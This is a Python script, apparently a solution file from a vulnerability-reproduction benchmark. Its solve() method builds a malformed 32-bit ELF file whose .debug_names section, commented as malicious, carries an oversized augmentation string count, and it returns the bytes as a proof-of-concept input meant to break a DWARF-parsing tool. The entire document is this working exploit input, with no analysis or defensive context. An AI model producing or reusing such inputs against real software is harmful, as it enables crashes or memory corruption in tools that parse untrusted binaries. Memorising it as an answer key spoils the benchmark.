import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def uleb128_encode(n: int) -> bytes:
            result = bytearray()
            while True:
                byte = n & 0x7f
                n >>= 7
                if n == 0:
                    result.append(byte)
                    return bytes(result)
                result.append(byte | 0x80)

        # 1. Malicious .debug_names section content
        unit_length = 20
        version = 5
        debug_abbrev_offset = 0
        address_size = 4
        augmentation_string_count = 0x10000000

        header_part1 = struct.pack('<I', unit_length)
        header_part1 += struct.pack('<H', version)
        header_part1 += struct.pack('<I', debug_abbrev_offset)
        header_part1 += struct.pack('<B', address_size)
        
        header_part2 = uleb128_encode(augmentation_string_count)
        for _ in range(6):
            header_part2 += uleb128_encode(0)

        debug_names_header = header_part1 + header_part2
        
        padding_size = 30 - len(debug_names_header)
        debug_names_data = debug_names_header + (b'\x00' * padding_size)

        # 2. Section header string table (.shstrtab) content
        shstrtab_data = b'\x00.shstrtab\x00.debug_names\x00'
        sh_name_shstrtab_offset = 1
        sh_name_debug_names_offset = 11

        # 3. ELF File Construction (32-bit)
        elf_header_size = 52
        sht_entry_size = 40
        num_sht_entries = 3

        sht_offset = elf_header_size
        shstrtab_data_offset = sht_offset + num_sht_entries * sht_entry_size
        debug_names_data_offset = shstrtab_data_offset + len(shstrtab_data)

        e_ident = b'\x7fELF\x01\x01\x01' + b'\x00' * 9
        elf_header = e_ident
        elf_header += struct.pack('<HHI', 1, 3, 1)
        elf_header += struct.pack('<III', 0, 0, sht_offset)
        elf_header += struct.pack('<IHHHHHH', 0, elf_header_size, 0, 0, sht_entry_size, num_sht_entries, 1)

        sht = b''
        sht += b'\x00' * sht_entry_size
        
        sht += struct.pack('<IIIIIIIIII',
            sh_name_shstrtab_offset,
            3,
            0,
            0,
            shstrtab_data_offset,
            len(shstrtab_data),
            0, 0, 1, 0
        )
        
        sht += struct.pack('<IIIIIIIIII',
            sh_name_debug_names_offset,
            1,
            0,
            0,
            debug_names_data_offset,
            len(debug_names_data),
            0, 0, 1, 0
        )
        
        poc = elf_header + sht + shstrtab_data + debug_names_data
        
        return poc